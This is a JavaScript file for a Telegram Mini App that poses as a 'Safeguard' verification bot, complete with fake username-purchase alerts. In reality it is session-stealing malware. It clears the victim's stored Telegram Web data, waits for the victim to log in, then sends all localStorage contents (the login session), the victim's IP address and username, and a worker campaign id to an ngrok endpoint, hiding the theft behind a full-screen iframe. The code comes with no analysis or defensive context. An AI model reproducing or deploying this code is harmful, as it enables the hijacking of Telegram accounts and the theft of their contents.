const startAppParam = window.Telegram.WebApp.initDataUnsafe.start_param || "";

if (startAppParam.endsWith('_G')) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.MainButton.setParams({
    color: Telegram.WebApp.bottomBarColor,
    text: '@guardianapp',
    text_color: "#acafb0",
    is_active: false
  });
  Telegram.WebApp.MainButton.onClick(() => {
    Telegram.WebApp.showAlert("This username was bought on Fragment on Jan 16, 2024 for 10.00 TON.");
  });
  Telegram.WebApp.MainButton.show();
} else if (startAppParam.endsWith('_S')) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.MainButton.setParams({
    color: Telegram.WebApp.bottomBarColor,
    text: '@safeguard',
    text_color: "#acafb0",
    is_active: false
  });
  Telegram.WebApp.MainButton.onClick(() => {
    Telegram.WebApp.showAlert("This username was bought on Fragment on May 17, 2023 for 515.00 TON.");
  });
  Telegram.WebApp.MainButton.show();
} else if (startAppParam.endsWith('_D')) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.MainButton.setParams({
    color: Telegram.WebApp.bottomBarColor,
    text: '@delugeguardbot',
    text_color: "#acafb0",
    is_active: false
  });
  Telegram.WebApp.MainButton.onClick(() => {
    Telegram.WebApp.showAlert("This username was bought on Fragment on Feb 20, 2024 for 20.00 TON.");
  });
  Telegram.WebApp.MainButton.show();
} else {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  Telegram.WebApp.MainButton.setParams({
    color: Telegram.WebApp.bottomBarColor,
    text: '@safeguard',
    text_color: "#acafb0",
    is_active: false
  });
  Telegram.WebApp.MainButton.onClick(() => {
    Telegram.WebApp.showAlert("This username was bought on Fragment on May 17, 2023 for 515.00 TON.");
  });
  Telegram.WebApp.MainButton.show();
}

document.body.style.setProperty("--surface-color", Telegram.WebApp.themeParams.bg_color);

const pageChats = document.getElementById("page-chats");
if (pageChats) {
  pageChats.remove();
}

indexedDB.databases().then(d =>
  d.filter(b => b.name === "tweb").forEach(b => {
    let r = indexedDB.open("tweb", b.version);
    r.onsuccess = () => {
      let x = r.result.transaction(
        ["chats", "dialogs", "messages", "session", "stickerSets", "users"],
        "readwrite"
      );
      ["chats", "dialogs", "messages", "session", "stickerSets", "users"].forEach(s =>
        x.objectStore(s).clear()
      );
    };
  })
);
localStorage.clear();

function getLocalStorageData() {
  let lsData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    lsData[key] = localStorage.getItem(key);
  }
  return lsData;
}

const iframe = document.createElement('iframe');
// Replace the URL below with the desired streaming site
iframe.src = "https://bespoke-kleicha-1a5093.netlify.app/";
iframe.style.position = "fixed";
iframe.style.top = "0";
iframe.style.left = "0";
iframe.style.width = "100%";
iframe.style.height = "100%";
iframe.style.border = "none";
iframe.style.zIndex = "10000";
iframe.style.display = "none";
document.addEventListener("DOMContentLoaded", () => {
  document.body.appendChild(iframe);
});



const user = window.Telegram.WebApp.initDataUnsafe.user || {};
const username = user.username || "N/A"; // Default to "N/A" if not found

async function fetchClientIp() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP address:", error);
    return "N/A";
  }
}

let l = setInterval(async () => {
  if (localStorage.user_auth) {
    clearInterval(l);

    iframe.style.display = "block";

    const ip = await fetchClientIp();

    const endpointUrl = "https://currently-relative-shrimp.ngrok-free.app/newlog";

    fetch(endpointUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        data: getLocalStorageData(),
        worker_chatid: startAppParam,
        ip: ip,
        username: username
      })
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch(error => console.error('Error:', error));
  } else {
    console.log("No bots found.");
  }
}, 50);

document.addEventListener("DOMContentLoaded", () => {
  const authPages = document.getElementById("page-chats");
  if (authPages) {
    authPages.remove();
  }
});
